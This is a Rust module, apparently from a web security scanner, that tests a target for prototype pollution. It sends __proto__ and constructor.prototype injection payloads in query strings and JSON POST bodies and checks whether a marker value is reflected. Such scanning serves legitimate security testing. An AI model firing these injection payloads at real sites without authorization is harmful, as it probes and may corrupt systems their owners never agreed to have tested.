use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// Prototype Pollution detection via __proto__ and constructor injection
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: Prototype Pollution to XSS", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() { return Ok(()); }

    let client = HttpClient::new()?;

    // Query-string based prototype pollution
    let pollution_payloads = vec![
        "__proto__[polluted]=lzrecon",
        "__proto__.polluted=lzrecon",
        "constructor[prototype][polluted]=lzrecon",
        "constructor.prototype.polluted=lzrecon",
    ];

    // Append pollution params to the URL
    for payload in &pollution_payloads {
        let test_url = if target.contains('?') {
            format!("{}&{}", target, payload)
        } else {
            format!("{}?{}", target, payload)
        };

        if let Ok(result) = Analyzer::send_and_analyze(&client, &test_url, "").await {
            // Check if pollution shows up in JS objects in the response
            if result.response_body.contains("\"polluted\":\"lzrecon\"")
                || result.response_body.contains("polluted: 'lzrecon'")
                || result.response_body.contains("polluted=\"lzrecon\"")
            {
                println!(
                    "{} CONFIRMED: Prototype Pollution — server reflects polluted property",
                    "[!]".red().bold()
                );
                println!("    Payload: {}", payload);
                println!("    Impact: Potential XSS via gadget chain");
                return Ok(());
            }
        }
    }

    // JSON body-based pollution for POST endpoints
    let json_payloads = vec![
        r#"{"__proto__":{"polluted":"lzrecon"}}"#,
        r#"{"constructor":{"prototype":{"polluted":"lzrecon"}}}"#,
    ];

    for payload in &json_payloads {
        if let Ok(resp) = client.inner.post(target)
            .header("Content-Type", "application/json")
            .body(payload.to_string())
            .send().await
        {
            let body = resp.text().await?;
            if body.contains("polluted") && body.contains("lzrecon") {
                println!(
                    "{} CONFIRMED: Prototype Pollution via JSON body",
                    "[!]".red().bold()
                );
                println!("    Impact: Server-side prototype pollution");
                return Ok(());
            }
        }
    }

    Ok(())
}
